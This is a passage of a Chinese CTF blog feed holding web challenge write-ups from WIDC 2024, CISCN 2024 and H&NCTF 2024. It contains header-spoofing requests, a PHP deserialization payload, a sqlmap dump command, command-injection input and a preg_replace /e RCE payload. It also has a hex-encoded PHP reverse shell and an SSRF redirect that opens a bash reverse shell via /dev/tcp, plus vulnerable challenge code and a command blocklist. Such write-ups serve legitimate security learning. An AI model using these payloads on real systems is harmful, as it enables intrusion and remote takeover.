class="hljs-string">&quot;10&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;bottom&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Event Log&quot;</span> order=<span class="hljs-string">&quot;11&quot;</span> side_tool=<span class="hljs-string">&quot;true&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Commander&quot;</span> internal_type=<span class="hljs-string">&quot;SLIDING&quot;</span> order=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;SLIDING&quot;</span> weight=<span class="hljs-string">&quot;0.4&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Ant Build&quot;</span> order=<span class="hljs-string">&quot;1&quot;</span> weight=<span class="hljs-string">&quot;0.25&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;right&quot;</span> content_ui=<span class="hljs-string">&quot;combo&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Hierarchy&quot;</span> order=<span class="hljs-string">&quot;2&quot;</span> weight=<span class="hljs-string">&quot;0.25&quot;</span>/&gt;<br>&lt;window_info anchor=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;Database&quot;</span> order=<span class="hljs-string">&quot;3&quot;</span>/&gt;<br>&lt;/layout&gt;<br>&lt;/component&gt;<br>&lt;component name=<span class="hljs-string">&quot;TypeScriptGeneratedFilesManager&quot;</span>&gt;<br>&lt;option name=<span class="hljs-string">&quot;version&quot;</span> value=<span class="hljs-string">&quot;1&quot;</span>/&gt;<br>&lt;/component&gt;<br>&lt;component name=<span class="hljs-string">&quot;editorHistoryManager&quot;</span>&gt;<br>&lt;entry file=<span class="hljs-string">&quot;file://$PROJECT_DIR$/src/.idea/workspace.xml&quot;</span>&gt;<br>&lt;provider selected=<span class="hljs-string">&quot;true&quot;</span> editor-<span class="hljs-built_in">type</span>-<span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;text-editor&quot;</span>&gt;<br>&lt;state relative-caret-position=<span class="hljs-string">&quot;493&quot;</span>&gt;<br>&lt;caret line=<span class="hljs-string">&quot;29&quot;</span> column=<span class="hljs-string">&quot;14&quot;</span> lean-forward=<span class="hljs-string">&quot;true&quot;</span> selection-start-line=<span class="hljs-string">&quot;29&quot;</span> selection-start-column=<span class="hljs-string">&quot;14&quot;</span> selection-end-line=<span class="hljs-string">&quot;29&quot;</span> selection-end-column=<span class="hljs-string">&quot;14&quot;</span>/&gt;<br>&lt;/state&gt;<br>&lt;/provider&gt;<br>&lt;/entry&gt;<br>&lt;entry file=<span class="hljs-string">&quot;file://$PROJECT_DIR$/src/PPlab.php&quot;</span>&gt;<br>&lt;provider selected=<span class="hljs-string">&quot;true&quot;</span> editor-<span class="hljs-built_in">type</span>-<span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;text-editor&quot;</span>/&gt;<br>&lt;/entry&gt;<br>&lt;entry file=<span class="hljs-string">&quot;file://$PROJECT_DIR$/src/trueflag.php&quot;</span>&gt;<br>&lt;provider selected=<span class="hljs-string">&quot;true&quot;</span> editor-<span class="hljs-built_in">type</span>-<span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;text-editor&quot;</span>&gt;<br>&lt;state relative-caret-position=<span class="hljs-string">&quot;34&quot;</span>&gt;<br>&lt;caret line=<span class="hljs-string">&quot;7&quot;</span> column=<span class="hljs-string">&quot;22&quot;</span> selection-start-line=<span class="hljs-string">&quot;7&quot;</span> selection-start-column=<span class="hljs-string">&quot;22&quot;</span> selection-end-line=<span class="hljs-string">&quot;7&quot;</span> selection-end-column=<span class="hljs-string">&quot;22&quot;</span>/&gt;<br>&lt;/state&gt;<br>&lt;/provider&gt;<br>&lt;/entry&gt;<br>&lt;entry file=<span class="hljs-string">&quot;file://$PROJECT_DIR$/src/index.php&quot;</span>&gt;<br>&lt;provider selected=<span class="hljs-string">&quot;true&quot;</span> editor-<span class="hljs-built_in">type</span>-<span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;text-editor&quot;</span>&gt;<br>&lt;state relative-caret-position=<span class="hljs-string">&quot;425&quot;</span>&gt;<br>&lt;caret line=<span class="hljs-string">&quot;30&quot;</span> column=<span class="hljs-string">&quot;14&quot;</span> selection-start-line=<span class="hljs-string">&quot;30&quot;</span> selection-start-column=<span class="hljs-string">&quot;14&quot;</span> selection-end-line=<span class="hljs-string">&quot;30&quot;</span> selection-end-column=<span class="hljs-string">&quot;14&quot;</span>/&gt;<br>&lt;/state&gt;<br>&lt;/provider&gt;<br>&lt;/entry&gt;<br>&lt;entry file=<span class="hljs-string">&quot;file://$PROJECT_DIR$/.idea/workspace.xml&quot;</span>&gt;<br>&lt;provider selected=<span class="hljs-string">&quot;true&quot;</span> editor-<span class="hljs-built_in">type</span>-<span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;text-editor&quot;</span>&gt;<br>&lt;state relative-caret-position=<span class="hljs-string">&quot;-1887&quot;</span>/&gt;<br>&lt;/provider&gt;<br>&lt;/entry&gt;<br>&lt;/component&gt;<br>&lt;/project&gt;<br></code></pre></td></tr></table></figure><p>flag在trueflag.php 源码在/PPlab.php</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">GET /PPlab.php HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">172.10</span><span class="hljs-number">.0</span><span class="hljs-number">.17</span>:<span class="hljs-number">1221</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0.8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0.7</span><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Chrome<br>X-Forwarded-For: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><br></code></pre></td></tr></table></figure><p>得到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>/**<br> * Created by PhpStorm.<br> * User: vvlab<br> * Date: <span class="hljs-number">22</span>-<span class="hljs-number">12</span>-<span class="hljs-number">27</span><br> * Time: 下午<span class="hljs-number">5</span>:<span class="hljs-number">38</span><br> */<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">show</span> &#123;<br>    public $filename;<br>    function printContent() &#123;<br>        $content = file_get_contents($this-&gt;filename);<br>        echo $content;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> ($_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>    echo <span class="hljs-string">&#x27;Only Localhost can see&#x27;</span>;<br>    die();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ($_SERVER[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>] != <span class="hljs-string">&#x27;Chrome&#x27;</span>) &#123;<br>    echo <span class="hljs-string">&#x27;Browser is not Chrome&lt;br&gt;&#x27;</span>;<br>    echo <span class="hljs-string">&#x27;Please use Chrome browser!&#x27;</span>;<br>    die();<br>&#125;<br>show_source(__FILE__);<br><br><br>$a = null;<br><span class="hljs-keyword">if</span> (isset($_POST[<span class="hljs-string">&#x27;show&#x27;</span>])) &#123;<br>    $a = unserialize($_POST[<span class="hljs-string">&#x27;show&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (!is_object($a)||get_class($a) != <span class="hljs-string">&#x27;show&#x27;</span>) &#123;<br>        $a = new show();<br>        $a-&gt;filename = <span class="hljs-string">&quot;text.txt&quot;</span>;<br>    &#125;<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    $a = new show();<br>    $a-&gt;filename = <span class="hljs-string">&quot;text.txt&quot;</span>;<br>&#125;<br>$a-&gt;printContent();<br>Hello, It doesn<span class="hljs-string">&#x27;t seem to be here. Take a closer look</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">show</span> &#123;<br>    public $filename= <span class="hljs-string">&#x27;trueflag.php&#x27;</span>;<br>    function printContent() &#123;<br>        $content = file_get_contents($this-&gt;filename);<br>        echo $content;<br>    &#125;<br>&#125;<br>$a = new show();<br>echo serialize($a);<br>//O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;show&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;trueflag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/widc2024/1716349768393-4d48f192-b479-4cd3-9097-9f65976b4b56.png"></p><h3 id="Day1-不安全的TSP平台"><a href="#Day1-不安全的TSP平台" class="headerlink" title="Day1-不安全的TSP平台"></a>Day1-不安全的TSP平台</h3><p><code>python .\sqlmap.py  -l 1.txt -p &quot;password&quot; -D sql -T user -C flag --dump --time-sec=10 --batch --dbms=MySQL</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">POST /login.php HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">172.10</span><span class="hljs-number">.0</span><span class="hljs-number">.22</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>Content-<span class="hljs-type">Type</span>: application/x-www-form-urlencoded<br>Referer: http://<span class="hljs-number">172.10</span><span class="hljs-number">.0</span><span class="hljs-number">.22</span>/<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Accept-Encoding: gzip, deflate<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">124.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span><br>Cache-Control: <span class="hljs-built_in">max</span>-age=<span class="hljs-number">0</span><br>Origin: http://<span class="hljs-number">172.10</span><span class="hljs-number">.0</span><span class="hljs-number">.22</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0.8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0.7</span><br>Content-Length: <span class="hljs-number">21</span><br>X-Forwarded-For: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><br>username=admin&amp;password=admin<br></code></pre></td></tr></table></figure><p><img src="/mdimg/widc2024/1716359999963-e60ba4bc-24ed-4128-a2f0-a24524e98708.png"></p><h3 id="Day1-车载通信协议"><a href="#Day1-车载通信协议" class="headerlink" title="Day1-车载通信协议"></a>Day1-车载通信协议</h3><p><img src="/mdimg/widc2024/1716361736331-29582517-4c1e-4fbe-81cc-5386daf161a5.png"></p><h3 id="Day1-ping出强大"><a href="#Day1-ping出强大" class="headerlink" title="Day1-ping出强大"></a>Day1-ping出强大</h3><p><img src="/mdimg/widc2024/1716366682912-484c07c5-b06c-4b41-90d8-391132667d19.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">POST /index.php HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">172.10</span><span class="hljs-number">.0</span><span class="hljs-number">.15</span>:<span class="hljs-number">49154</span><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">124.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0.8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0.7</span><br>Content-<span class="hljs-type">Type</span>: application/x-www-form-urlencoded<br><br>ip=<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>%0An\l fl\ag.php<br></code></pre></td></tr></table></figure><p><img src="/mdimg/widc2024/1716366692657-dfb95b52-b12c-4dea-b7b6-0d146059f07b.png"></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第十七届全国大学生信息安全竞赛创新实践能力赛初赛-web</title>
    <link href="/2024/05/22/%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E5%88%9D%E8%B5%9B-web/"/>
    <url>/2024/05/22/%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E5%88%9D%E8%B5%9B-web/</url>
    
    <content type="html"><![CDATA[<h3 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(isset($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    $cmd = escapeshellcmd($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <br>     <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, $cmd)) &#123;<br>         system($cmd);<br>&#125;<br>&#125;<br><br><br>show_source(__FILE__);<br>?&gt;<br></code></pre></td></tr></table></figure><p>无参rce<br>可以用php -r 执行php代码<br>可以用16进制绕过反弹shell<br>这里hex2bin接收字符串，但是过滤了引号<br>substr不带引号传入参数虽然会报错但仍会执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">$shell = <span class="hljs-built_in">hex</span>($sock=fsockopen(<span class="hljs-string">&quot;ip&quot;</span>,<span class="hljs-number">6666</span>);system(<span class="hljs-string">&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);)<br>cmd=php -r <span class="hljs-built_in">eval</span>(hex2bin(substr(a$shell,<span class="hljs-number">1</span>)));<br></code></pre></td></tr></table></figure><p>flag在数据库中<br><img src="/mdimg/ciscn2024/1716091216481-65a0dfdf-a094-4f37-a0a8-4335b2beb2a0.jpeg" alt="1716091213182.jpg"></p><h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><p>扫到一个flag.php<br>后面提示<br><img src="/mdimg/ciscn2024/1716091481274-aa3ceb98-1b7a-4fe3-94d7-58955b4a6d7d.png"><br>要ssrf来利用flag.php<br>找xunruicms的洞<br>在官网公示的漏洞里找到ssrf<br><img src="/mdimg/ciscn2024/1716091727963-01b15570-9ca5-48ce-bbf4-9cf76e3df86f.png"><br><a href="https://codeload.github.com/dayrui/xunruicms/zip/refs/heads/master">https://codeload.github.com/dayrui/xunruicms/zip/refs/heads/master</a><br>在<code>dayrui\Fcms\Core\Helper.php</code><br><img src="/mdimg/ciscn2024/1716109624503-89020950-dc94-4243-9dc1-78ecb143e4a5.png"><br>可以访问外链<br>利用302跳转绕过127.0.0.1 利用flag.php弹shell<br>在vps写一个302跳转的网页</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php header(<span class="hljs-string">&#x27;Location: http://127.0.0.1/flag.php?cmd=bash -c &quot;bash -i &gt;&amp;/dev/tcp/ip/6666 0&gt;&amp;1&quot;&#x27;</span>,true,<span class="hljs-number">302</span>); exit(); ?&gt;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?s=api<span class="hljs-variable">&amp;c</span>=api<span class="hljs-variable">&amp;m</span>=qrcode<span class="hljs-variable">&amp;text</span>=1<span class="hljs-variable">&amp;thumb</span>=http://ip/<span class="hljs-variable">&amp;size</span>=10<span class="hljs-variable">&amp;level</span>=1<br></code></pre></td></tr></table></figure><p><img src="/mdimg/ciscn2024/1716091580346-4ef6f2b0-8544-4823-8572-a9f2ffcb3425.png"></p><h3 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h3><p>加了验证，利用GIF头绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">GIF89a &lt;?php echo <span class="hljs-string">&quot;GIF89a&quot;</span>; header(<span class="hljs-string">&#x27;Location: http://127.0.0.1/flag.php?cmd=bash -c &quot;bash -i &gt;&amp;/dev/tcp/ip/6666 0&gt;&amp;1&quot;&#x27;</span>,true,<span class="hljs-number">302</span>); exit(); ?&gt;<br></code></pre></td></tr></table></figure><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?s=api<span class="hljs-variable">&amp;c</span>=api<span class="hljs-variable">&amp;m</span>=qrcode<span class="hljs-variable">&amp;text</span>=1<span class="hljs-variable">&amp;thumb</span>=http://ip/<span class="hljs-variable">&amp;size</span>=10<span class="hljs-variable">&amp;level</span>=1<br></code></pre></td></tr></table></figure><p><img src="/mdimg/ciscn2024/1716109890528-7e336f78-977e-438c-96d1-66ad640a6352.jpeg" alt="1716109886449.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>H&amp;NCTF 2024 -web</title>
    <link href="/2024/05/14/H&amp;NCTF%202024/"/>
    <url>/2024/05/14/H&amp;NCTF%202024/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;moran&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>];<br>  <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="hljs-variable">$str1</span>) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str2</span>) != <span class="hljs-number">19</span> || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="hljs-variable">$str2</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<br>  &#125;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;<br><br></code></pre></td></tr></table></figure><p><code>var_dump(scandir(&#39;/&#39;);</code>读目录<br><code>task=readfile($_POST[1])&amp;flag=Please_give_me_flag&amp;1=/flag</code><br><img src="/mdimg/HNCTF2024/1715600446320-858ab2ae-7e63-4e03-a3e9-ebd5ccb9e910.png"></p><h3 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h3><p>index在<code>/App/Home/Controller/IndexController.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Home</span>\<span class="hljs-title class_">Controller</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-comment">//$this-&gt;show(&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; body&#123; background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.8em; font-size: 36px &#125; a,a:hover&#123;color:blue;&#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V&#123;$Think.version&#125;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&#x27;,&#x27;utf-8&#x27;);</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;装起来了&#x27;</span>;    <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">h_n</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;getallheaders&#x27;</span>)) &#123;<br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getallheaders</span>(<span class="hljs-params"></span>) </span>&#123;<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (<span 